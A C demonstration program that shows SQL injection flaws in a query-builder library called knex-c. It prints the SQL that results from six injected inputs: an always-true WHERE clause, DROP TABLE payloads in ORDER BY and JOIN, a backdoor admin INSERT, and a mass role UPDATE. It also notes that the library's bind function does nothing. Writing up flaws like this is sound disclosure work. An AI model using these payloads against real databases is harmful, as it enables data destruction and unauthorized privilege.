/*
 * knex-c SQL Injection Vulnerability Demonstration
 *
 * WARNING: This file demonstrates security vulnerabilities.
 * It does NOT execute actual SQL - just shows what queries would be generated.
 */

#include "kknex.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    printf("\n=====================================\n");
    printf("knex-c SQL Injection Vulnerability\n");
    printf("=====================================\n\n");

    // Attack 1: WHERE clause SQL injection
    printf("❌ Attack 1: WHERE Clause Injection\n");
    printf("─────────────────────────────────────\n");
    kknex_query_t *q1 = kknex_new();
    kknex_table(q1, "users");
    kknex_where(q1, "id=1' OR '1'='1");  // SQL INJECTION
    char *sql1 = kknex_to_select(q1);
    printf("Query: %s\n", sql1);
    printf("Issue: Returns ALL users (authentication bypass)\n");
    printf("Expected: id=1 only\n");
    printf("Actual: id=1' OR '1'='1 (always true)\n\n");
    free(sql1);
    kknex_free(q1);

    // Attack 2: ORDER BY injection with destructive command
    printf("❌ Attack 2: ORDER BY Injection (Table Drop)\n");
    printf("────────────────────────────────────────────\n");
    kknex_query_t *q2 = kknex_new();
    kknex_table(q2, "users");
    kknex_select(q2, "id, name");
    kknex_order_by(q2, "name; DROP TABLE users;--", NULL);  // SQL INJECTION
    char *sql2 = kknex_to_select(q2);
    printf("Query: %s\n", sql2);
    printf("Issue: Drops the users table!\n");
    printf("Expected: ORDER BY name ASC\n");
    printf("Actual: Executes DROP TABLE command\n\n");
    free(sql2);
    kknex_free(q2);

    // Attack 3: JOIN injection
    printf("❌ Attack 3: JOIN Injection\n");
    printf("────────────────────────────\n");
    kknex_query_t *q3 = kknex_new();
    kknex_table(q3, "users");
    kknex_join(q3, "admin'; DROP TABLE users;--", "id=1");  // SQL INJECTION
    char *sql3 = kknex_to_select(q3);
    printf("Query: %s\n", sql3);
    printf("Issue: Modified JOIN clause with destructive command\n");
    printf("Expected: JOIN with valid table\n");
    printf("Actual: Syntax error + DROP TABLE command\n\n");
    free(sql3);
    kknex_free(q3);

    // Attack 4: INSERT VALUES injection
    printf("❌ Attack 4: INSERT Injection (Data Manipulation)\n");
    printf("──────────────────────────────────────────────\n");
    kknex_query_t *q4 = kknex_new();
    kknex_table(q4, "users");
    char *sql4 = kknex_insert(q4, "username, password",
                              "'admin', 'password'); INSERT INTO admins VALUES ('hacker', 'hacked');--");
    printf("Query: %s\n", sql4);
    printf("Issue: Inserts admin + creates backdoor admin user\n");
    printf("Expected: Insert one user\n");
    printf("Actual: Inserts two users with admin privileges\n\n");
    free(sql4);
    kknex_free(q4);

    // Attack 5: UPDATE injection
    printf("❌ Attack 5: UPDATE Injection (Privilege Escalation)\n");
    printf("────────────────────────────────────────────────────\n");
    kknex_query_t *q5 = kknex_new();
    kknex_table(q5, "users");
    char *sql5 = kknex_update(q5, "role='admin' WHERE id=1; UPDATE users SET role='admin';--");
    printf("Query: %s\n", sql5);
    printf("Issue: Makes ALL users admins\n");
    printf("Expected: Update one user's role\n");
    printf("Actual: Sets all users to admin\n\n");
    free(sql5);
    kknex_free(q5);

    // Attack 6: False security - kknex_bind() does nothing
    printf("❌ Attack 6: kknex_bind() False Security\n");
    printf("──────────────────────────────────────────\n");
    kknex_query_t *q6 = kknex_new();
    kknex_table(q6, "users");
    kknex_where(q6, "id=?");           // Placeholder
    kknex_bind(q6, "123");             // This does nothing!
    char *sql6 = kknex_to_select(q6);
    printf("Query: %s\n", sql6);
    printf("Issue: Placeholder '?' is not replaced with '123'\n");
    printf("Expected: id=123 (with proper parameter binding)\n");
    printf("Actual: id=? (placeholder remains)\n");
    printf("Note: kknex_bind() stores param in array but it's NEVER used\n\n");
    free(sql6);
    kknex_free(q6);

    // Summary
    printf("=====================================\n");
    printf("SUMMARY\n");
    printf("=====================================\n");
    printf("✅ Tests Completed\n");
    printf("❌ ALL ATTACKS SUCCEED\n");
    printf("❌ NO PROTECTION AGAINST SQL INJECTION\n");
    printf("❌ kknex_bind() IS NON-FUNCTIONAL\n");
    printf("\nSeverity: CRITICAL\n");
    printf("Recommendation: DO NOT USE IN PRODUCTION\n");
    printf("\n");

    return 0;
}
